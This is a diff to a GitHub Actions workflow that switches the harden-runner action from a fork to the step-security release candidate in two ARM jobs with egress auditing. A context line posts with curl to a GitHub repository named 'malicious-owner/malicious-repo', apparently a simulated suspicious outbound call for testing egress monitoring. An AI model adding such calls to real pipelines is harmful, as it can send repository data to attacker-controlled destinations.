@@ -11,7 +11,7 @@ jobs:
     if: always()
     runs-on: ARMLinuxRunner
     steps:
-      - uses: h0x0er/harden-runner@arm-support
+      - uses: step-security/harden-runner@rc
         with:
           egress-policy: audit
       - uses: actions/checkout@v3
@@ -28,7 +28,7 @@ jobs:
     if: always()
     runs-on: ARMLinuxRunner
     steps:
-      - uses: h0x0er/harden-runner@arm-support
+      - uses: step-security/harden-runner@rc
         with:
           egress-policy: audit
       - run: curl -XPOST https://api.github.com/repos/malicious-owner/malicious-repo
